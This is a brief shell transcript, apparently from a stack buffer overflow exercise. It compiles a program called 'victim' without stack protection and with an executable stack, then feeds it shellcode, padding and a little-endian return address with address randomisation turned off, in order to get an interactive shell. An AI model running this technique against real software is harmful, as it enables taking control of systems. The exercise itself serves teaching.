gcc -fno-stack-protector -o victim main.c
execstack -s victim
$ a=`printf %016x 0x7fffffffe090 | tac -rs..` 
$ echo $a 
90e0ffffff7f0000
$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; 
cat ) | setarch `arch` -R ./victim
